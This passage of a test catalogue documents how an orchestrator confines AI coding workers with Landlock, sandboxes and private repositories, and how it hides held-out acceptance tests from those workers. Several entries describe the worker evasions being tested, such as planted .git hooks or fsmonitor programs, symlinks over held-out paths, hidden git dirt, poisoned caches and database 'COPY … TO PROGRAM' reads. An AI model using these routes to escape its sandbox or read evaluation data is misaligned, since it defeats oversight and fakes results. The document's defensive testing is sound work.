`main` and `phase_finalize` call it; `_run_has_nothing_to_push` holds for
the `done:` terminal phases and not otherwise. Restoring `main()`'s direct
`_write_run_json(st.run_dir, no_push=bool(args.no_push))` turns the no-work
resume and the rule red.

`tests/test_resume_after_phase1_death.py` (5 tests, DESIGN §6 *Resumable
planning*, *The first phase is a phase like any other*; review round 23
M2): real `main()` twice — a fresh run that dies inside the real
`phase_classify`, then `resume` on the state it left. A budget death in
classify resumes after the cap is raised; every resumable phase-1 exit
(worker error, context overflow, disk low) resumes and spawns the classifier; a state with no `task` is still refused.

`tests/test_remote_push_choice.py` (14 test functions, 16 cases; DESIGN §6
*One push choice per run, on every runtime*). Every step is the real code,
no cloud CLI called: the launcher's NO_PUSH resolution and its hand-off of
the choice to a fresh run as `--no-push` (an env-only opt-out reaches the
orchestrator, a pushing run gets nothing, a resume forwards only its own
push flag, the in-machine argv from `_render_launch_suffix` is exactly the
launcher's flags); a Fly run through real `main()`, the real `fetch_branch`
over a stubbed `flyctl` and the real `host_finalize` (a fresh `--no-push`
run, an env-only opt-out and a plain resume of a `--no-push` run are not
pushed, with a resume with `--push` and a fresh pushing run as controls that
are); and the real `finalize` verb reads the record (a recorded `no_push` is
not pushed, `--no-push` on the verb skips a run recorded to push, and a run
recorded to push reaches the push).

`tests/test_delivery_detection.py::TestReask` (9 tests; DESIGN §8 *Delivery
detection*, *One re-ask*; review round 24 M1), rewritten over a real git
lane: `created` is read from the lane's untracked test-shaped files, `ran`
from the sample's executed Bash commands (`_falsifier_runs_probe`). A
heredoc probe that ran (the r24 run a command verbatim) and one run in a
separate call are not re-asked; a sample that wrote nothing, or wrote and
never ran, is; a Write-tool probe still counts; leads, an edited tracked
file and a symlink are not probes; `_falsifier_runs_probe` on the real
pytest and vitest commands and edge shapes; the session id read from the
log, and `claude_p` adding the resume flag. Through the real
`_run_delivery_detection` (`TestRunDeliveryDetection`),
`test_a_previous_samples_probe_is_not_the_next_samples` shows a previous
sample's probe never counts for the next.

## The rev 9 redesign's other new and rewritten test files

- `tests/test_resume_staging_is_reset.py` (7 tests, DESIGN §8 *The final
  diff describes the tree that ships*): the real `setup-run.sh` resets a
  staging worktree a SIGKILL left registered — tracked edits, untracked
  files and a merge in progress go; ignored files and the run branch stay.
- `tests/test_one_restore.py` (8 tests, DESIGN §8 *One restore*, review
  round 15 M2): `_restore_tree` and `leerie_reset_worktree` are the one
  restore — write bits restored, a nested repository removed, and I1's
  checker reading nothing afterwards — so I1's exhaustion path rolls the
  round back instead of `die()`ing; the reviewer's proofs, inverted. Also:
  a derived guard that no `reset --hard` runs outside the primitive, a
  back-out whose reset does not land never reports the work as gone, and
  the shell reset never `chmod`s through a symlink.
- `tests/test_merge_leaves_staging_as_found.py` (2 tests, DESIGN §6½,
  review round 15 M3): on the real setup-run.sh, new-worktree.sh and
  integrate.sh, a merged `.gitignore` change that un-ignores a build's
  output has that output removed by the merge's bracket, and a
  repository `post-merge` hook does not run on leerie's merge.
- `tests/test_tree_on_its_branch.py` (11 tests, review round 15 H1/H2): a
  worker leaves its tree on the branch leerie gave it, at a descendant of
  where it started (I1's branch and base lines); the tree that ships is
  `refs/heads/leerie/runs/<id>^{tree}`, read after finalize's cleanup.
- `tests/test_leerie_git_runs_no_hooks.py` (7 tests, DESIGN §6½ *Hooks
  off*): every git process leerie starts runs with hooks off through the
  environment entry `main()` installs before anything spawns
  (`_git_hooks_off`; it round-trips and keeps the operator's own
  `GIT_CONFIG_*` entries), and only a worker's spawn takes it back out
  (`_git_hooks_on` in `_invoke`). The order is checked as the property, not
  a position: the call precedes `_become_subreaper`, and nothing before it
  in `main()` reaches a process-starting call through the module's
  functions (the position pin broke when `_guard_terminal_streams()` went
  first; with the call moved after `_become_subreaper` the test fails). Real git with every hook installed: the
  I2 bracket's put-back and every git form leerie uses fire none, and every
  script leerie runs turns hooks off itself (`leerie_git_hooks_off`), also
  when run outside the orchestrator.
- `tests/test_run_repo.py` (27 tests, DESIGN §6 *The run's own
  repository*, RC4/I4): every tree a worker gets hangs off `<run-dir>/repo`,
  a bare repository of the run's own, so no worker's git verb reaches the
  user's refs, stash, config, `info/exclude`, hooks or worktree registry;
  review round 16 H2's drivers inverted — the user's stash survives a
  worker's `stash`/`pop`, and a worker cannot move the user's branches.
  Review round 17: a worker's `git init` in staging (`core.bare` rewritten)
  costs the run nothing, and a recorded repository failing its check is
  never deleted (H1); every tree kind works under
  `safe.bareRepository=explicit` (M3); the rebaser's prompt range resolves
  in its own repository (M1); a mid-run branch switch brings no other
  commit in (L1); a crash-left scratch directory is removed (L2). Real git,
  real scripts and helpers.
- `tests/test_work_read_only.py` (17 tests, DESIGN §6 *The explicit
  channel: the user's checkout is mounted read-only*): the launcher mounts
  `$USER_REPO:/work:ro` and keeps the state root out of it; a worker-style
  write to a read-only bind mount fails while the run's reads work (skipped
  where unprivileged user namespaces are refused) and, with
  `LEERIE_TEST_CONTAINER_IMAGE` set, the same through the real
  `container-entry.sh` in a real container; the entry's `chown` runs only on
  a writable `/work` (its mount-table read, four shapes); capture inside the
  container records into the run directory and leaves the checkout alone,
  every in-container seam passes `record_in`, the host apply merges against
  the user's current config once and keeps an unreadable file, and both
  `host_apply_captured_deps` and the launcher's EXIT-trap function apply the
  ran run's capture only; phase 1½'s hook and `mise` run in a removed
  throwaway checkout; the checkout snapshot never rewrites the user's index;
  with no run repository the prune and the abnormal-exit clean-up write
  nothing in the cwd's `.git`.
- `tests/test_credentials_never_outlive_the_run.py` (10 test functions, 25
  cases; DESIGN §6 *No copy of the credentials outlives its run's process*,
  *Every deleter of a run's directories deletes them*; review round 18 M1,
  round 19 claims H1, exec M1 and L2): the owner-aware removal takes
  read-only and unreadable directories, never follows a link, and reports a
  survivor; the real `main()`, run in its own process with `_orchestrate`
  making a worker's configuration (so the template), `measure/`,
  `tree-stores/` and the run's `stores/`, leaves none of them, nor the secret,
  however it ends — a return, a return with no copy of the credentials, a
  real `phase_finalize` whose dependency capture makes the template again
  (it is there after finalize, gone after the exit), a forked child's own
  exit (which leaves the parent's), the rate limit's exec (released before
  it), and each exit `main()`'s top-level `try` handles; the set of those
  handlers is read from `main()`'s source and must equal the set the test
  drives; a full purge removes a run whose template is read-only; the
  preflight reap removes an idle run's copies; the reviewer's driver
  inverted — the real launcher `prune --apply` removes a run that died
  mid-run, its read-only template with it; prune counts a run removed only
  when it is gone; the shell removal; no run-directory deleter ignores its
  errors. With it, `tests/test_collect_subtrees_sh.py`'s
  `test_the_integrator_gets_the_shared_kill_deny_notice_and_hook`: the
  collection's integrator had its own configuration while it ran, and the
  payload removed it and the template when it exited, keeping the shared
  caches (red when the template's making registered for removal at the
  guard helper's exit, which removed them before the integrator ran).
- `tests/test_every_removal_is_owner_aware.py` (3 tests, DESIGN §6 *Every
  deleter of a run's directories deletes them*; review round 19 claims M1):
  `rmtree` is called only inside `_rmtree_owned`; the launcher's
  `shutil.rmtree` only inside `_rm_owned`; every `rm -rf` in
  `scripts/*.sh` is inside `leerie_rm_owned` or of a `mktemp` directory the
  same script made.
- `tests/test_view_moves.py` (6 tests, DESIGN §8 *A view moves to the next
  tip when the install's inputs are unchanged*; review round 18 L1), real
  git, the real scripts and `_measured_tree` with an incremental stand-in
  install: a new tip with the same inputs moves the view — the install's
  file keeps its inode, the install runs again over it, the build runs
  again, and a measurement's report, a cache under `node_modules`, a stale
  build output, a build's file under the install's output, the view's own
  stores and its measurement directory are all gone;
  a changed `package.json` makes a fresh view; an in-place edit of an
  installed file that keeps its size and resets its mtime makes a fresh
  view; a rewritten `.git` is pointed back at the view's own repository and
  the other repository is untouched; a failed install is not recorded; the
  install key changes with an input, a `patches/` file, a nested manifest,
  the install entries, their environment and a named copy input, and with
  nothing else.
- `tests/test_tree_repos.py` (11 tests, DESIGN §6 *A repository per
  committing tree (I6)*): staging and a subtask tree are worktrees of their
  own bare repositories (the run repository's objects through the
  alternates, the run's settings copied, one ref, no object copied), and the
  run repository never prunes; with the run repository read-only, as I5
  grants it, a worker commits and cannot move the run branch or a sibling's;
  a take moves exactly the tree's own branch (a ref the worker made, a
  run-branch copy it moved, the branch its HEAD is on stay out); every
  worker exit takes, a failed one included; integration merges from the run
  repository and takes staging, and a rollback through `_restore_tree`
  reaches the run repository; a resume takes what a killed worker committed;
  a judge checks out a synthetic merge, and a commit a worker left on a
  detached HEAD, from the run repository; a tree made
  in the run repository is made again; a tree repository's settings are
  checked and restored; pruning a tree takes it and removes its repository.
  `tests/conftest.py::worker_exit` is what a worker's exit does, for tests
  that stand in for a worker by committing in its tree.
- `tests/test_run_repo_bring_back.py` (19 tests): `host_bring_back_run_branch`
  brings the run branch back from the run's repository into the user's as
  leerie's own git (hooks off, no `FETCH_HEAD`), as a compare-and-swap
  against `run.json` `brought_back_sha`, so a finalize rebase or the user's
  own change to the ref is never undone, and only as a fast-forward (round
  17 H1). The launcher's post-exit steps read only the run the container
  named (two runs: the older one, which it ran, is finalized), and its own
  traps bring the branch back under SIGINT (round 17 M2). Real git, real
  bash, `jq`.
- `tests/test_run_repo_missing_dies.py` (4 tests, review round 17 H1/L4): a
  helper worktree added with no run repository dies naming it — the add
  itself, CI parity's `_ci_worktree` and `_evaluate_acceptance_sets`, which
  had read `no_base_worktree` and "no evidence" — and the conftest tripwire
  fails a test that would make a real run repository under this checkout.
- `tests/test_hidden_dirt.py` (17 tests, review round 16 H1/M2, DESIGN §8
  *A worker leaves its tree clean*, *One restore*): dirt a worker hides from
  `git status` — `skip-worktree`/`assume-unchanged` index flags, a pattern
  in the shared `info/exclude` or `core.excludesFile` — is read by I1's
  checker (untracked files by git's standard rules through leerie's
  settings, §8 *One ignore rule*, with `info/exclude` put back first) and
  cleared by the restore; the implementer's base is where its subtask
  branch forked from the run branch.
- `tests/test_worker_settings_are_put_back.py` (5 tests, review round 18
  H1, DESIGN §8 *The settings are leerie's*). A worker's change to its
  tree repository's settings is put back by leerie and never counted
  against it. Real run repository, real `setup-run.sh` and
  `new-worktree.sh`, real git, and the gate:
  - The real husky 9 `prepare` (node, `LEERIE_TEST_HUSKY_DIR`, binding when
    set; skipped unset) runs in a worker tree, with the user's checkout
    holding `hooksPath = .husky/_` and holding no hooks path. The worker
    commits, `_take_after_worker` puts the config back and takes, and the
    gate finds the tree clean with no re-ask, the commit in the run
    repository.
  - `core.fileMode=false` hides a mode change from the worker's own git,
    but each checker half alone shows ` M run.sh`, and the re-ask names it
    and says nothing about settings.
  - A missing copy stops the run at the gate and at the worker's exit.

  Falsified, each turning a test red: the tip's code; no put-back at the
  worker's exit; none in the Python checker; none in the shell checker;
  and a gate that re-asks a settings line. `tests/test_run_settings.py`
  and `tests/test_hidden_dirt.py` assert the same contract: what a setting
  hid is the file's own line, and every key DESIGN §8 lists is put back by
  either checker half alone.
- `tests/test_needs_human_sources_render.py` (7 test functions, 15
  cases; DESIGN §6 *The PR's end-state section*, review round 14 H1):
  every "Needs human verification" source the code can write renders in
  the PR; the sources
  are derived from the code (`*_GAP_SOURCE` constants and literal `source`
  keys of dicts written to `needs_human_verification`), never listed by
  hand.
- `tests/test_round14_delivery_verdicts.py` (7 tests): review round 14's
  kept delivery items end to end — M2, a verdict counts only on the tree
  it was measured on and a final judge that fails in any way reads
  nothing; M3, a ratchet's unverified items derive from what its routes
  read; M4, an item index means one item everywhere.
- `tests/test_judges_read_the_committed_tree.py` (7 tests, rewritten, DESIGN
  §8 *Every post-execution verdict is of the committed tree*): the
  delivery judges read a detached checkout of staging's HEAD, no install,
  removed afterwards — never staging, whose ignored files (an untracked
  helper, a stale `dist/` build) held a verdict up in review rounds 12-13.
- `tests/test_test_files_template.py` (35 tests, DESIGN §9 *Operands that
  are already test files take the runner's direct form*): the direct
  (`vitest run`, `jest --runTestsByPath`) and affected (`related`,
  `--findRelatedTests`) templates, the direct form derived from a declared
  `test_scoped` (wrapper and environment kept), vitest's substring-filter
  collisions excluded by escaped absolute path or no command at all, and
  the executed call sites.
- `tests/test_clean_tree_gate.py` (17 tests, DESIGN §8 *A worker leaves its
  tree clean*): the I1 checker, the bounded re-ask of the same session,
  exhaustion rolling the round back, and every staging site.
- `tests/test_committed_view.py` (10 tests, review round 17, DESIGN §8
  *Every measurement reads the committed view*): a measurement of a worker
  tree runs in a detached checkout of its branch tip. A self-ignoring
  untracked `.gitignore` and the `helper.py` it hid are not measured, and
  nothing is shared in from the worker's tree: dependencies are leerie's
  install from the committed lockfile, build outputs leerie's build.
- `tests/test_stores_are_leeries.py` (5 test functions, 6 cases; DESIGN
  §6 *The stores a view installs from are leerie's*): leerie's commands use
  the run's own stores (`<run-dir>/stores/`), a worker only its run's
  caches; a worker's poisoned cache does not reach a view; an in-place edit
  by a committed `postinstall` reaches its own run's store and never another
  run's view, whose store is its own. Driven with a pnpm-like stand-in
  installer.
- `tests/test_run_stores.py` (4 test functions, 6 cases; DESIGN §6 *The
  stores a view installs from are leerie's*; the user's `web` run 6f147a0c
  on 0.44.3): real pnpm 10.4.1, 10.28.2 and 11.21.0 (from the user's
  corepack cache; skipped without it) install through `_measured_tree` →
  `_ensure_worktree_deps` under the real Landlock grant and write the run's
  store (10.28.2 its `v10/projects/` registry); an in-place, same-size,
  mtime-restored edit of an installed file in one run is absent from the
  next run's fresh install, the two stores sharing no inode; every
  run-wide store variable (npm's `_logs` included) is written by a
  measured command and by no worker; two runs never share a store.
  Live-falsified 2026-11-04: with the run's stores read-only in the grant,
  the three installs, the cross-run case and the write probe fail; with one
  store shared by both runs, the cross-run case fails on the shared inodes
  (real pnpm 10.4.1 served the clean file there, so the inode check is the
  discriminator; the stand-in test in `test_stores_are_leeries.py` fails on
  the content). 0.44.3's own `_ensure_worktree_deps` fails web's real
  pnpm 10.28.2 install with `EACCES … symlink …
  pnpm-store/v10/projects/<hash>` (container proof, DESIGN §6 *corepack
  never floats*).
- `tests/test_worker_confinement.py` (23 test functions, 27 cases, DESIGN
  §6 *A worker writes only where it is granted (I5)*): a real child confined by
  `scripts/landlock_exec.py` with the grants `_worker_grants` derives, on
  leerie's run layout, writes only its grant and reads nothing of the run
  it is not given; the writes notice is rendered from that grant
  (`_confined_writes_notice`), every path it names writable under the
  shim, and `claude_p` appends it to a worker with a shell (review round
  18 M9). Every fixer (4 cases) is refused by the kernel each file that
  records a held-out set, a shell `cat` included, which is why those CLI
  `Read` denies are gone. A read-only worker in a subtask tree reads that
  tree's own repository (`<run>/tree-repos/<tree>/`), so its `git` works
  there, and writes nothing of it. No confined process, a worker or a
  measurement (2 cases), can open or list the host's build slots
  (`LEERIE_HOST_DIR`), while what lies beside that directory is read; the
  worker case grants the test's `tmp_path` through `_apart`, as conftest's
  `_test_tmp_readable_by_measurements` does for the measurement case,
  because a worker's grants never name `/tmp`, where pytest puts
  `tmp_path` — without it the worker case read nothing beside the host
  directory and passed only with `TMPDIR` beneath `$HOME`. With `_host_dir()`
  returning None both cases fail.
- `tests/test_confinement_refusal_stops_the_run.py` (10 test functions;
  DESIGN §6 *A confinement failure stops the run; it is never a result*;
  the 2026-11-03 22:41 incident, where a refusing shim was recorded as
  build failures, a crashed worker and a non-fatal capture error). The
  real shim writes its refusal to `--refusal-fd` (a pty on one of its
  fds); a command's own exit 126 under the real shim writes nothing, and
  its attempt to write the descriptor fails; an AST rule that no exit 126
  in the shim bypasses `_refused` (and, since the round-39 fold, `_taken`
  beside it); `_isolation_failed` writes it. With a refusing shim stub (os
  and sys only), `_run_streaming`, `_invoke` and `_ts_script_run` raise
  `ConfinementRefused`, not an `Exception`; with the real shim a command's
  own 126 is returned as status 126; every `_confined_argv` call names
  `refusal_fd`; the real `main()` exits `EXIT_CONFINEMENT_REFUSED` (78)
  with `state.json` as the step left it, no `finished_at`, and no capture
  attempted. Falsified (2026-11-04), each failing exactly its test:
  `_refused` not writing the descriptor; the descriptor left inheritable;
  `_run_streaming` or `_invoke` closing it instead of checking;
  `_ts_script_run` with an unchecked descriptor; `main()` exiting 1.
  `tests/test_credentials_never_outlive_the_run.py` drives the new
  `main()` arm.
- `tests/test_held_out_path_taken_is_not_a_refusal.py` (9 test functions,
  15 cases; DESIGN §6 *A confinement failure stops the run; it is never a
  result*, *A held-out evaluation runs alone*; review round 39, isolation
  R1 and D2). The real shim's `place()` raises `PlacementTaken` for a
  link, a file, or a file at the path (3), and places a plain directory
  (control); an `ENOSPC` while placing is still an `IsolationError`;
  `run_sandbox` with the real `place` writes the `--taken-fd` descriptor
  and leaves the refusal descriptor empty (3); the attack (`tests ->
  spec_real` under a held-out `tests/acceptance/acc.test.js`) through
  `_acceptance_run_placed` with the real `_run_streaming` records
  `path_in_use`, spawns nothing and writes nothing through the link (2);
  the set audit and the parse check find the path taken (2);
  `_run_streaming` raises `HeldOutPathTaken`, an `OSError` and not
  `ConfinementRefused`; a refusal outranks a taken path; and the
  command's open of `/proc/<shim>/fd/N` without `--isolate` is refused
  with `EACCES` (`_undumpable`), the pipe left empty. Falsified
  (2026-11-04), one change at a time: the old acceptance pre-check, audit
  and parse checks; every placing errno reported as a refusal (6 shim
  tests); `_run_streaming` ignoring the taken pipe; taken checked before
  the refusal; `run()` without `_undumpable`. `tests/heldout_sandbox_emulator.py`
  and `tests/conftest.py` pass and honour `--taken-fd`.
- `tests/test_relay_holds_no_refusal.py` (3 test functions; DESIGN §6 *A
  confinement failure stops the run; it is never a result*; review round
  40, isolation F1) — the relay is forked from a non-dumpable shim and
  holds neither descriptor. The real `serve_relays`, in a process of its
  own given both descriptors, holds neither once it has relayed a
  connection; the real `main()`, with the namespace and Landlock steps
  stood in for, calls `_undumpable` before `start_relays`, and a failure
  there refuses with the listeners closed and no relay; isolated (runs in
  the container), the running relay of the real `--isolate --egress`
  shim refuses its parent `/proc/<relay>/environ`. Falsified
  (2026-11-04): `serve_relays` without the closes fails the first;
  `main()` without its `_undumpable` fails the second; both, run in a
  container of the 0.44.1 image, fail all three (all three pass there
  with the fix).
- `tests/test_run_settings.py` (54 tests, review rounds 17 H2 and 18 H1,
  DESIGN §8 *The settings are leerie's*): both checker halves and both
  restore halves. A setting written from a worker's tree (each key DESIGN
  §8 lists, in each half) is put back before the read, so what it hid is
  the file's own line; the global settings are read from leerie's copy.
- `tests/test_one_ignore_rule.py` (4 tests, review round 17 H3, DESIGN §8
  *One ignore rule*): I1 and I2 read untracked files by the same rule, and
  a guard derived from the source finds no listing of untracked files
  outside it, in Python or the shell.
- `tests/test_repo_commands_keep_their_hooks.py` (6 tests, review round 17
  M4, DESIGN §6½ *Hooks off*, §6 *Leerie's runs of the repository's
  commands are confined too*): the repository's own commands, launched
  through `_run_streaming` or the self-check's spawn with
  `_repo_command_env`, run with hooks as the repository expects, while
  leerie's own git keeps them off. Derived guards: every call of
  `_run_streaming`, `_run_contained` and `_measure_blt` passes `grants`,
  which has no default; `_run_streaming`'s one spawn is the confined argv;
  the self-check is the one raw spawn; `node` and `mise` are never spawned
  directly.
- `tests/test_measurement_confinement.py` (4 tests, DESIGN §6 *Leerie's
  runs of the repository's commands are confined too*): a real child
  confined with `_measurement_grants` writes its view and measurement
  directory and is refused the run's state (the held-out sets,
  `state.json`, the worker cache, leerie's store, the run repository's
  refs, sibling trees, another tree's measurement directory); its temp and
  caches point at its own directory.
- `tests/test_measurement_grant_lifetime.py` (9 tests, same section): a
  tree made again at a path gets a fresh measurement directory and a
  removed tree's is swept; the grant kinds differ only where designed; the
  toolchain kind empties the hook's trust records; a tree holding the run
  directory is refused; `claude_p` records the first committing worker; a
  confined worker reads the run's mise overrides; through the real
  `_run_setup_hook`, a tool beneath `~/.local/bin` is written and a confined
  worker imports it, while the hook's pip user base is its checkout's and no
  worker reads it, and the checkout has `core.hooksPath` set and a `.git`
  file (DESIGN §6½ step 1).
- `tests/test_store_classes.py` (12 tests, DESIGN §6 *Which stores an
  install may share*): every store variable has exactly one class; a run
  tree's commands get that tree's own stores, each made 0700 (review round
  20 claims L3: under umask 0 a plain `mkdir` left them 0777); each manager's no-code fetch
  runs its argv on data files only (6 cases); a bun install copies; a
  replaced view takes its tree stores with it.
- `tests/test_tree_git_is_addressed.py` (9 tests, review round 19
  isolation H1, DESIGN §6 *Leerie's git never takes a tree's repository
  from the tree*):
  - A view and a subtask tree have their `.git` rewritten, as a file
    naming a planted repository and as a `.git` directory in its place.
    The planted repository names programs through `core.fsmonitor`,
    filters, textconv and hooks. Every leerie read and restore of the tree,
    in Python and in the shell, reads the real repository, and none of the
    programs runs.
  - A tree repository whose worktree's `commondir` names another
    repository is refused.
  - The round's measurement proof, inverted: the confined command's
    planted fsmonitor never runs, and the held-back set, the run branch
    and `state.json` stay as they were.
  - Three guards derived from the source: no `-C` in a leerie git argv
    outside `_tree_git_args`; every git command run with a working
    directory names its repository; and every script that sources
    `worktree-lib.sh` runs git on a tree only through `leerie_tgit`.

  Falsified, each turning tests red: the helper following `.git`, in
  Python and in the shell; no `commondir` check; a `.git` directory read
  as a clone before the repository's record; and one site of each kind
  put back for each guard.
- `tests/test_unmeasured_is_not_done.py` (9 tests, review round 19
  execution, DESIGN §6 *The run outcome is decided once*, "`done` rests on
  measurements that ran"). Driven through the real `_decide_outcome`, and
  the real `_refresh_test_id_diff` for the install case, on a run
  repository whose run branch is the tree that ships:
  - `done` needs a failing-test-ID diff of exactly that tree when the
    repository has a test command. No diff, a diff of another tree, a
    failed install on that tree (named in the reason), or failing tests
    the base could not be rerun against each make the run `unconverged`.
  - An unmeasured held-out set makes the run `unconverged`.
  - A test command the task forbids, a repository with no test command,
    and a run with no commits are not gaps.

  Falsified, each turning tests red: the decider not consulting the rule
  (5), the held-out part dropped (1), the refresh not recording why (1),
  and the base-rerun check dropped (1). Eight assertions in four files
  that expected `done` with no verdict now expect `unconverged`:
  - `test_acceptance_unmeasured_pr` (3);
  - `test_delivery_detection` (2);
  - `test_acceptance_held_case_intermittent` (2);
  - `test_decide_outcome`'s unmeasured case (1), now its own test.
- `tests/test_provision_survives_resume.py` (4 tests, review round 19 M3,
  DESIGN §6 *Resumable planning*, "A checkpoint covers only what ran
  before it is saved"). Through the real `_run_phases` on the resume
  harness of `test_resume_planning_reentry.py`, a resume past the
  `plans_after_classify` checkpoint:
  - with no recipe runs `phase_provision` and the gate;
  - with a recipe and no gate result runs only the gate;
  - with both runs neither.

  The gate records its result. Against the code before the fix, 3 of the
  4 fail. The fourth, finished provisioning not being redone, holds there
  too, because nothing was ever redone.
- `tests/test_confined_store_install.py` (6 test functions; DESIGN §6
  *The stores a view installs from are leerie's*, *corepack never floats*,
  *pnpm's settings are spelled for the pnpm that reads them*; review round
  19 exec H2). Under real Landlock with `_measurement_grants`: a measured
  install writes the run's stores, its tree's own stores and the
  measurement's state and runtime directories, and neither reads nor
  writes another run's store; a measured Python's user base is its tree's
  store, not `$HOME`; no measurement kind carries a package-manager
  setting; every `npm_config_<k>` a measurement or install environment
  carries is a key npm knows or pnpm 10 reads; corepack is bounded.
- `tests/test_measurement_tmp.py` (18 test functions, 19 cases; DESIGN §6
  *A confined command's scratch is short and private*, *Every confined
  process has its own `/tmp`, `/dev/shm` and IPC*, *A confined command's
  processes end with it*; review round 19 exec H1). Review round 19's
  execution driver turned round, on the real shim and
  `_measurement_grants`, unisolated:
  - The private temp directory fits a socket path whatever the run
    directory's length, a measured command binds a socket in it, and its
    chain up to `/tmp` is one SWC accepts. Every directory leerie makes for
    a command or a worker is 0700; a private temp directory that is not
    this user's stops the run, and one made open before is closed.
  - No grant of any kind names `/tmp` itself, and an unisolated measured
    command writes its private temp directory and not `/tmp`. An
    unisolated worker neither reads nor writes `/tmp`, and its read grant
    names nothing in it.
  - The private temp directories go with their tree, with the run's
    scratch, and at the process's exit.
  - A background process (2 cases: one that ignores SIGTERM) and a timed-out
    command's processes are gone when the command returns, the shim keeps
    the command's exit status, and a worker session's background processes
    end with it.
  - Leerie's own temp directory is in the run directory, and `_run_phases`
    moves it first.
- `tests/test_exec_lock.py` (19 test functions, 21 cases; DESIGN §6 *A
  held-out evaluation runs alone, in a world that dies with it (I3)*, the
  time half; *The run's execution lock, then a host build slot,
  everywhere*): an evaluation runs with no measurement beside it and waits
  for running ones without starving; it waits for a running real `_invoke`
  worker, and a worker asked for meanwhile starts after it; a worker
  spawned inside an evaluation stops the run before spawning; a cancelled
  worker and a cancelled waiter release the lock; sections nest, a shared
  holder's own commands pass through a waiting evaluation, and an
  evaluation inside a shared hold stops the run; two runs' locks never
  block each other (the lock has no host level), and an evaluation that
  must wait logs what it waits for and how long it waited, one that need
  not logs nothing. By rule over the module, nothing reachable inside
  `_held_out_section` spawns a worker or waits on a raw semaphore, lock or
  second slot a shared holder may hold — stopping at the gates that pass
  through inside an exclusive hold (`_blt_slot`, `_build_class_slot`,
  `_confirm_hold`, and a nested `_held_out_section`) — with the rule's own
  catch of planted violations and its acceptance of the gates; the gates
  entered inside an exclusive hold while another holder has each raw
  resource pass through, and the same entry outside one waits (the two arms
  disagree); every shared holder takes the lock after its semaphores; and
  nothing reachable inside a `_build_class_slot` hold takes a second slot,
  a section, a semaphore or a worker (one build, one slot, by rule: this
  replaced the `_BUILD_SLOT_HELD` flag). The order (review round 31,
  isolation E1, execution 5): an evaluation takes its host slot once it
  holds the lock exclusive (with the host's one slot held by another run it
  waits holding the exclusive; with it free it enters at once — 2 cases),
  a command takes its slot inside its shared hold, also when it already
  holds the lock shared (round 30's order stopped the run there), and an
  evaluation waiting for its run's workers holds no slot, so another run
  (another event loop) gets the host's one slot at once. Falsified against
  the round-30 order, 4 cases fail: the build-slot rule, the other two
  order tests, and the first one's slot-held case (its slot-free case
  passes either way; the slot-held case waited forever on a starter that
  died, and now bounds that wait). Both cases of the pass-through test
  hang against that order.
  `tests/test_build_peak_sizing.py::test_slots_are_shared_through_the_host_dir`
  is unchanged but for its comment: its two holders now each hold the
  run's lock shared, then a slot.
- `tests/test_falsifier_exec_queue.py` (3 test functions, 5 cases;
  DESIGN §6 *Evaluations queue on the lock itself*, review round 21
  execution M1): the real `_falsify_items`, `_falsifier_gates`,
  `_confirm_still_failing` and `_ExecLock`, with the worker, the probe's
  runs and the facts read as stand-ins holding the lock as the real ones
  do. Every item confirms (first run, B\* rerun, facts read), no worker
  starts inside a confirm, and no worker that asked after a confirm was
  queued starts before it — random lengths, and the convoy's shape set
  up; the wall time stays under 2.2x the same schedule with confirms
  serial and no worker held back. Live-falsified: the pre-fix shape
  (a confirm lock outside the execution lock, a section per run) and the
  one-hold-inside-a-confirm-lock shape each turn all five red. Measured
  with the same harness (5 seeds): 1.52x at 4 lanes / 16 items and 1.79x
  at 8 / 32, against 2.86x and 4.88x for the pre-fix shape.
- `tests/test_confinement_entry.py` (9 tests; DESIGN §6 *Fail closed, on
  every entry*, review round 21 execution H1): by rule, no statement of
  `main()` before `_require_confinement` reaches `_confined_argv` through
  the module's references, and the entry is one unconditional statement
  of its body (with planted catches of a dispatch above it and a
  conditional entry); the entry runs Landlock's check then the sandbox's,
  and `preflight()` runs neither; the real `main()` driven as a fresh run,
  `resume <id>`, `--phase judge` and `--phase heal` calls it before the
  dispatch, whose first confined spawn carries `--isolate`; `list` and
  `--report` skip it. Live-falsified: the entry made fresh-only fails the
  resume test and the rule; moved below the `--phase` branch, it fails
  both phase tests and the rule.
- `tests/test_heldout_sandbox_callers.py` (20 test functions, 22 cases; DESIGN §6 *A held-out
  evaluation runs alone*, *No database server leerie starts is ever
  unconfined*): every run of a set file carries the whole set as `place`
  pairs in a section, none of it on disk at any spawn; a path the tree
  already has is never placed; end to end (through
  `tests/heldout_sandbox_emulator.py`) the report reaches leerie only
  through the descriptor and the tree is unchanged; the parse probe is
  placed and its marker is the report; a rule over the held-out runners.
  The database: the URL refusal accepts only the command's own socket;
  `_test_db_argv` wraps only a Prisma/PostgreSQL repo, one name per
  command; a held-out run, a worker (`claude_p(db=True)`) and a
  database-requiring CI check are wrapped; by rule leerie never starts a
  server or runs `prisma`; F2 turned round — the schema push runs under
  the command's Landlock domain (`NoNewPrivs: 1`, `acceptance/` refused)
  and the command gets the URL but never the consent; F1 turned round with
  the host's real PostgreSQL (skipped without one) — the command's own
  server answers over its socket, `COPY … TO PROGRAM` cannot read
  `acceptance/`, and the server is gone with the command; a name that is
  not a test database is refused (125); confined but unisolated, the
  script runs the command unchanged without a database, its stdout clean.
  A promised database (review round 21 execution L2): `require` puts
  `scripts/require-test-db.sh` after the wrapper; `_test_db_present`, executed
  under the shim, is True only when the command was handed the composed
  URL (a fake wrapper handing it, another URL, or none), False where the
  real wrapper falls back unisolated, and spawns nothing outside a
  Prisma/PostgreSQL repo; `claude_p(db_required=True)` puts the guard
  between the wrapper and `claude`. `tests/test_acceptance_set_audit.py`
  adds the consumer (1 test function, 2 cases): the same Prisma repository
  gets the REAL DATABASE section and `db_required` only when the check
  says a database came up. Live-falsified by restoring the shape-based
  `has_db` and dropping the guard (7 red).
- `tests/test_delivery_detection.py`, a falsifier's probe as held-out
  content (DESIGN §6 *A held-out evaluation runs alone*; 3 tests): the
  confirm runs, through the real gates and `_capture_failing_test_ids`,
  each run alone in a sandbox over the pristine checkout with the probe
  placed and never on disk there; the AST facts read places the probe too
  and returns its JSON through the report (needs node and a `typescript`
  copy, `LEERIE_TEST_TYPESCRIPT_DIR`); a sentinel in a confirmed probe's
  source and the sample's prose is in neither `unmet_final` nor the
  re-drive's re-check, the saved probe is outside every implementer grant,
  and the re-drive's re-run of it is placed in a sandbox.
- `tests/test_heldout_isolation.py` (5 tests, all `real_heldout_sandbox`,
  skipped where the shim has no `isolation_error()` or the host cannot
  build a sandbox): review round 20's H1 (`/dev/shm`, System V) and H2 (the
  AST gate's relay of `/tmp`) and the measured F1 (`COPY … TO PROGRAM`
  from the command's own database; its one listener `127.0.0.1:5432` in a
